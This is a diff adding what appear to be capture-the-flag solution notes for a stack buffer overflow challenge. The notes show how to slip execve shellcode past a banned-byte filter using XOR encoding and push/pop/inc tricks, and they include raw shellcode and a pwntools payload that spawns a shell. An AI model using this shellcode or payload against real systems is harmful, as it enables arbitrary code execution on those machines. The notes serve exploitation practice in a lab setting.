@@ -1,0 +1,68 @@
+Banned chars:
+
+[2f, 62 , 69, 6e, 2f, 73, 68]
+
+'''
+for (int i = 0; i < len; i++)
+    {
+        // Hackers seem to use these a lot hmm
+        if (buffer[i] == 0x3b ||
+                buffer[i] == '/' ||
+                buffer[i] == 'b' ||
+                buffer[i] == 'i' ||
+                buffer[i] == 'n' ||
+                buffer[i] == 's' ||
+                buffer[i] == 'h')
+            return 0;
+    }
+'''
+
+/bin/sh => 0x2f62696e2f7368
+/bin/sh (little endian) => 0x68732f6e69622f
+
+In linux an / extra doesn't matter, and since our /bin/sh is 7 bytes an extra byte would be very helpfull for stack aligment:
+
+/bin//sh => 0x68732f2f6e69622f
+
+
+To bypass 0x3b ban (sys_execve):
+
+push 0x3a ; puts in stack the 0x3a
+pop rax ;  rax = 0x3a (rax is used to perform syscalls)
+inc rax ; rax = 0x3a + 1 = 0x3b
+
+
+To bypass the rest of the characters:
+
+Open a XOR calculator and put our payload 0x68732f2f6e69622f. Xor it with a random number (that doesn't contain the banned characters) with 8 bytes.
+(Repeat until you find that both the newly generated number and the one you choose both don't contain the banned bytes)
+
+My assembly:
+
+xor rsi, rsi ; reset rsi
+push rsi ; pushes 0 on top of stack
+mov rdi, 0x9941791932927299 ; one of the generates numbers
+mov r9, 0xf13256365cfb10b6 ; another one generated number
+xor rdi, r9 ; you could also do mov rdi, number1 ^ number2 but I got some problems
+push rdi ; pushes new rdi value on top of the stack
+push rsp ; you can use rsp or rdx for the third NULL argument
+pop rdi ; pop latest value of the stack on rdi (xor'ed numbers)
+push 0x3a ; explained above
+pop rax ; explained above
+inc rax ; explained above
+syscall
+
+Jump address may vary (last exercise I used 0x..68 but it's a banned char now)
+
+jmp_address = p64(0x7fffffffed90)
+
+Solution:
+
+shellcode = b"\x48\x31\xF6\x56\x48\xBF\x99\x72\x92\x32\x19\x79\x41\x99\x49\xB9\xB6\x10\xFB\x5C\x36\x56\x32\xF1\x4C\x31\xCF\x57\x54\x5F\x6A\x3A\x58\x48\xFF\xC0\x0F\x05\x90\x90"
+print(len(shellcode))
+
+payload = b'\x90' * (112- len(shellcode)-8) + shellcode + b'\x90' * 7 + b'A'*8 + jmp_address
+print(len(payload))
+p.sendline(payload)
+
+p.interactive()
